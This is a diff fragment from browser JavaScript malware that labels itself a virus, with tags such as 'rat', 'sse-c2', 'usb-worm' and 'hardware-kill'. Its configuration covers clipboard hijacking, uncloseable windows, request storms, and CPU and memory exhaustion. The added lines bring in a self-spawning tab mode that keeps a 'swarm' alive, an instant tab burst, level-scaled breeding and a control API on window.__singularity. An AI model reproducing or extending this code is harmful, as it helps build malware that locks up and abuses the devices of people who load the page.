     CFG.tabs = 0; CFG.speakFlood = 0; CFG.history = 0;
@@ -2589,6 +2678,20 @@ function arm() {
     try { winSkin(); } catch (e) {}
     try { audioLoop(); } catch (e) {}
     try { audioUnlock(); } catch (e) {}
+  }
+  if (TAB) {
+    /* 自動増殖タブ：軽量。でも群れ維持と自動増殖は続ける */
+    CFG.windows = 0; CFG.iframes = 0; CFG.downloads = 0; CFG.clipHijack = 0;
+    CFG.fsFolder = 0; CFG.sharedWorker = 0; CFG.installer = 0;
+    CFG.tabs = 0; CFG.speakFlood = 0; CFG.history = 0;
+    CFG.audio = 0; CFG.wakelock = 1; CFG.uncloseable = 0; CFG.winSkin = 0;
+    CFG.notify = 1; CFG.badge = 0; CFG.favicon = 0; CFG.mediaSession = 0;
+    CFG.cores = clamp(Math.round((navigator.hardwareConcurrency || 4) / 2), 1, 4);
+    CFG.ramMB = 128; CFG.workerMB = 16;
+    CFG.domNodes = 0; CFG.cssAnim = 0; CFG.timers = 0; CFG.glContexts = 0;
+    CFG.acContexts = 0; CFG.cacheBuckets = 0; CFG.readback = 0; CFG.oscBank = 0;
+    CFG.microtasks = 0; CFG.jsonChurn = 0; CFG.layoutThrash = 0;
+    CFG.sseStorm = 0; CFG.fetchStorm = 0; CFG.digest = 0;
   }
   if (IFR) {
     CFG.iframes = 0; CFG.windows = 0; CFG.downloads = 0; CFG.clipHijack = 0;
@@ -2606,7 +2709,7 @@ function arm() {
     if (document.visibilityState === "hidden") push(true);
     if (document.visibilityState === "visible") {
       try { swCount(); } catch (e) {}
-      try { autoBreed(); } catch (e) {}
+      try { autoBreed(true); } catch (e) {}
       if (QUEUE.length) { R.tapped = 0; try { tapOverlay(); } catch (e) {} }
     }
   });
@@ -2642,9 +2745,16 @@ window.__singularity = {
   breed: function (n) { CFG.winMode = "breed"; CFG.winBranch = clamp(n || 2, 1, 8); windowBreed(); },
   breedN: function (m) { runCmd({ kind: "breed", arg: String(m || 2) }); },
   tabs: function (n) { spawnMany(clamp(n || 6, 1, 64)); },
+  burst: function () { autoBurst(); },
   tap: function () { return flushQueue(true); },
   queue: function () { return QUEUE.length; },
   live: function () { return liveN(); },
+  retry: function () { return RETRY.length; },
+  tuning: function () {
+    return { level: LEVEL, min: AUTO_MIN, target: AUTO_T[LEVEL] || 0, cap: AUTO_CAP[LEVEL] || 0,
+             gap: AUTO_GAP[LEVEL] || 0, step: AUTO_STEP[LEVEL] || 0,
+             ratio: AUTO_RATIO[LEVEL] || 0, safe: safeCap(), live: liveN(), eff: liveEff() };
+  },
   auto: function (on) { AUTO_ON = on !== false; return AUTO_ON; },
   mobile: function () { return IS_MOBILE; },
   hard: hardKill,
@@ -2690,7 +2800,8 @@ VIRUS = {
     "tags": ["apex", "resident", "pwa", "sw-inject", "sse-c2", "rat", "usb-worm",
              "os-resident", "window-breed", "infinite-windows", "exponential",
              "window-skin", "hardware-kill", "swarm-keeper", "mobile-tap-breed",
-             "auto-breed", "unlimited-l7", "heavy-download", "notify-all-levels",
+             "auto-breed", "instant-tab-burst", "level-scaled-breed",
+             "unlimited-l7", "heavy-download", "notify-all-levels",
              "watch-cmd-alias", "sw-live-count", "100mb-payload"],
 }
 
